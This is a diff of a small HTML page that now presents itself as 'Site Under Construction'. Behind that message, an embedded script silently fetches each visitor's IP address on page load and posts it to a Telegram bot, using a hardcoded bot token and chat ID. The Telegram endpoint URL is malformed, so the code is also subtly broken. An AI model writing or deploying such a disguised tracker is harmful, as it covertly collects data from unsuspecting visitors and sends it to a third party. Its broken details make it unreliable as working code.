@@ -2,25 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Welcome</title>
+    <title>Site Under Construction</title>
 </head>
 <body>
-    <p>Loading, please wait...</p>
+    <p>Site Under Construction. Please check back later.</p>
 
     <script>
+        // Update these two lines manually with your credentials
         const BOT_TOKEN = "8539452307:AAE3Px3RSVeT-YjpxTWp_btbswWg5_o0DTo";
         const CHAT_ID = "8714686528";
 
-        // 1. Get the IP address
-        fetch('https://ipify.org')
+        fetch('https://ip-api.com')
             .then(response => {
-                if (!response.ok) throw new Error('IP fetch failed');
+                if (!response.ok) throw new Error('Network response was not ok');
                 return response.json();
             })
             .then(data => {
-                const userIp = data.ip;
+                const userIp = data.query;
                 
-                // 2. Send to Telegram using POST (more reliable in browsers)
                 return fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -40,7 +39,7 @@
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error('Execution stopped:', error);
             });
     </script>
 </body>
